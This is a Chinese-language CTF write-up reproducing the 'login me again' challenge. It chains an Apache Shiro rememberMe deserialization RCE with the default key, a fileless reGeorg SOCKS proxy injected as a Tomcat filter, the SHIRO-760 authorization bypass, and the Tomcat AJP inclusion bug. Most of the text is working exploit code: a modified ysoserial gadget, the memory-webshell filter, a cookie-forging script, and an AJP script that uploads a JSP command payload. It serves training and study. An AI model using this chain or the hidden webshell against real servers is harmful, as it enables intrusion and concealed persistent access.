# SCTF-login me again

## 前言

内部举行CTF比赛，要刷一些题目备战。login me again是我发现的比较有挑战性的题目，根据提示和参考，进行了复现学习。难点主要为shiro的内存webshell实现，后期也是花了比较多的时间去研究此类技术的实现。



### 复现

环境：外网一个有shiro rce的不出网应用（打包成jar），内网有一个spring+最新版shiro写一个只允许图的上传功能(打包成war)，上传功能需要管理员权限（shiro鉴权）部署在有ajp漏洞的tomcat7上。

攻击思路：

1. 通过注入有socks5代理功能的webshell代理到内网。

2. 找到新的shiro权限绕过方法或者谷歌搜到我之前提交的issue

3. 用ajp漏洞包含刚才上传的图片rce




利用难点：

1. 市面上还没有socks5代理功能的无文件webshell，需要选手自己从已有的jsp构造转换成无文件的webshell。

2. 自己挖越权或者搜到我之前提交的那个越权issue或者用其他办法。

3. 市面ajp协议的介绍较少，需要选手自己研究如何用ajp协议上传文件。




**改造ysoserial**

为了在ysoserial中正常使用下文中提到的类，需要先在pom.xml中加入如下依赖

 

```
<dependency>

  <groupId>org.apache.tomcat.embed</groupId>

  <artifactId>tomcat-embed-core</artifactId>

  <version>8.5.50</version>

</dependency>

<dependency>

  <groupId>org.springframework</groupId>

  <artifactId>spring-web</artifactId>

  <version>2.5</version>

</dependency>
```



要让反序列化时运行指定的Java代码，需要借助TemplatesImpl，在ysoserial中新建一个类并继承AbstractTranslet，静态代码块中获取了Spring Boot上下文里的request，response和session，然后获取classData参数并通过反射调用defineClass动态加载此类，实例化后调用其中的equals方法传入request，response和session三个对象

 除此之外需要了解如下三个知识点：

- SpringBoot获取Request
- Javassist动态编程
- CommonsBeanutils



```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;

import com.sun.org.apache.xalan.internal.xsltc.TransletException;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;

import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

 

public class MyClassLoader extends AbstractTranslet {

  static{

​    try{

​      javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();

​      java.lang.reflect.Field r=request.getClass().getDeclaredField("request");

​      r.setAccessible(true);

​      org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();

​      javax.servlet.http.HttpSession session = request.getSession();

 

​      String classData=request.getParameter("classData");

​      System.out.println(classData);

 

​      byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);

​      java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});

​      defineClassMethod.setAccessible(true);

​      Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);

​      cc.newInstance().equals(new Object[]{request,response,session});

​    }catch(Exception e){

​      e.printStackTrace();

​    }

  }

  public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {

  }

  public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {

  }

}
```



在ysoserial.payloads.util包的Gadgets类中照着原有的createTemplatesImpl方法添加一个createTemplatesImpl(Class c)，参数即为我们要让服务端加载的类，如下直接将传入的c转换为字节码赋值给了_bytecodes



```java
public static <T> T createTemplatesImpl(Class c) throws Exception {
    Class<T> tplClass = null;

    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        tplClass = (Class<T>) Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
    }else{
        tplClass = (Class<T>) TemplatesImpl.class;
    }

    final T templates = tplClass.newInstance();
    final byte[] classBytes = ClassFiles.classAsBytes(c);

    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        classBytes
    });

    Reflections.setFieldValue(templates, "_name", "Pwnr");
    return templates;
}
```



复制CommonsBeanutils1.java的代码增加一个payload CommonsBeanutils1_ClassLoader.java，修改如下：



`final Object templates = Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);`

 

**打包(jdk<7u21)**

 

`mvn clean package -DskipTests`



**改造reGeorg**

对于reGeorg服务端的更改其实也就是request等对象的获取方式，为了方便注册filter，我直接让该类实现了Filter接口，在doFilter方法中完成reGeorg的主要逻辑，在equals方法中进行filter的动态注册

```java
package reGeorg;

import javax.servlet.*;
import java.io.IOException;

public class MemReGeorg implements javax.servlet.Filter{
    private javax.servlet.http.HttpServletRequest request = null;
    private org.apache.catalina.connector.Response response = null;
    private javax.servlet.http.HttpSession session =null;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
        javax.servlet.http.HttpSession session = request.getSession();
        String cmd = request.getHeader("X-CMD");
        if (cmd != null) {
            response.setHeader("X-STATUS", "OK");
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = request.getHeader("X-TARGET");
                    int port = Integer.parseInt(request.getHeader("X-PORT"));
                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();
                    socketChannel.connect(new java.net.InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    response.setHeader("X-STATUS", "OK");
                } catch (java.net.UnknownHostException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                } catch (java.io.IOException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try{
                    socketChannel.socket().close();
                } catch (Exception ex) {
                }
                session.invalidate();
            } else if (cmd.compareTo("READ") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = response.getOutputStream();
                    while (bytesRead > 0){
                        so.write(buf.array(),0,bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                    so.flush();
                    so.close();
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }

            } else if (cmd.compareTo("FORWARD") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    int readlen = request.getContentLength();
                    byte[] buff = new byte[readlen];
                    request.getInputStream().read(buff, 0, readlen);
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);
                    buf.clear();
                    buf.put(buff);
                    buf.flip();
                    while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                    socketChannel.socket().close();
                }
            }
        } else {
            filterChain.doFilter(request, response);
        }
    }

    public boolean equals(Object obj) {
        Object[] context=(Object[]) obj;
        this.session = (javax.servlet.http.HttpSession ) context[2];
        this.response = (org.apache.catalina.connector.Response) context[1];
        this.request = (javax.servlet.http.HttpServletRequest) context[0];

        try {
            dynamicAddFilter(new MemReGeorg(),"reGeorg","/*",request);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        return true;
    }

    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
        javax.servlet.ServletContext servletContext=request.getServletContext();
        if (servletContext.getFilterRegistration(name) == null) {
            java.lang.reflect.Field contextField = null;
            org.apache.catalina.core.ApplicationContext applicationContext =null;
            org.apache.catalina.core.StandardContext standardContext=null;
            java.lang.reflect.Field stateField=null;
            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;

            try {
                contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(name, filter);
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, null);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }catch (Exception e){
                ;
            }finally {
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }
        }
    }
}

```

借以下脚本生成POC

 

```
#python2
#pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

key  =  "kPH+bIxk5D2deZiIxcaaaA=="
mode =  AES.MODE_CBC
IV   = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode(key), mode, IV)

payload=base64.b64decode(sys.argv[1])
BS   = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
payload=pad(payload)

print(base64.b64encode(IV + encryptor.encrypt(payload)))
```



```
python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader anything |base64 |sed ':label;N;s/\n//;b label'`
```

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/1.png)

编译MemReGeorg.java后使用如下命令得到其字节码的base64

```
cat MemReGeorg.class|base64 |sed ':label;N;s/\n//;b label'
```

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/2.png)

在Cookie处填入 rememberMe=[ysoserial生成的POC]，POST包体填入classData=[MemReGeorg类字节码的base64]，注意POST中参数需要URL编码，发包



![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/3.png)

然后带上X-CMD:l3yxheader头再请求页面，返回X-STATUS: OK说明reGeorg已经正常工作

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/4.png)

reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断是否是reGeorg的jsp页面，由于这里是添加了一个filter，正常访问网页是不会有变化的，只有带上相关头才会进入reGeorg代码，所以需要将客户端中相关的验证去除

 

在askGeorg函数最后改为return True即可

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/5.png)

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/6.png)

需要配置全局代理，不然会本地DNS解析，无法访问到目标

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/7.png)

结合SHIRO-760漏洞，通过ajp上传文件：

https://issues.apache.org/jira/browse/SHIRO-760

精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938)

 

AJPy，在tomcat.py中提供了一种部署war包getshell的操作，这里面就有上传文件的操作

```
import sys
import os
from io import BytesIO
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from tomcat import Tomcat
target_host = "127.0.0.1"
gc = Tomcat(target_host, 8009)
filename = "shell.jpg"
payload = "<% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %>"
with open("/tmp/request", "w+b") as f:
    s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % filename
    s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
    f.write(s_form_header.encode('utf-8'))
    f.write(payload.encode('utf-8'))
    f.write(s_form_footer.encode('utf-8'))
data_len = os.path.getsize("/tmp/request")
headers = {
        "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
        "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
}
attributes = [
    {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.request_uri", "/;/admin/upload", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.path_info", "/", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.servlet_path", "", )
    }
, ]
hdrs, data = gc.perform_request("/", headers=headers, method="POST",  attributes=attributes)
with open("/tmp/request", "rb") as f:
    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
    responses = br.send_and_receive(gc.socket, gc.stream)
r = AjpResponse()
r.parse(gc.stream)
shell_path = r.data.decode('utf-8').strip('\x00').split('/')[-1]
print("="*50)
print(shell_path)
print("="*50)
gc = Tomcat('127.0.0.1', 8009)
attributes = [
    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", shell_path,)},
    {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
]
hdrs, data = gc.perform_request("/uploads/1.jsp", attributes=attributes)
output = sys.stdout
for d in data:
    try:
        output.write(d.data.decode('utf8'))
    except UnicodeDecodeError:
        output.write(repr(d.data))

```

![1](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/login_me/8.png)



参考链接：

https://xz.aliyun.com/t/7986?page=5#toc-1